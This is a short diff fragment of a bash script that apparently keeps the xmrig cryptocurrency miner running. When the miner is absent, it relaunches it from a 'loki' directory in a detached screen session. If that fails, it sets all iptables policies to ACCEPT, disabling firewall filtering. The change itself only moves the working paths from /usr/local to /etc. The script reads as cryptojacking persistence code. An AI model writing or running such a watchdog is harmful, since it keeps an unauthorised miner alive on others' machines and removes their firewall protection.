@@ -6,11 +6,11 @@ while true
 do
 #iip=$(dig +short myip.opendns.com @resolver1.opendns.com | sed -e "s/[.]/-/g")
 if [[ ! $(pgrep xmrig) ]]; then
-cd /usr/local/loki/
+cd /etc/loki/
 screen -S work -d -m bash -c "./auto"
 sleep 15
 if [[ ! $(pgrep xmrig) ]]; then
-cd /usr/local/
+cd /etc/
 iptables -P INPUT ACCEPT
 iptables -P OUTPUT ACCEPT
 iptables -P FORWARD ACCEPT
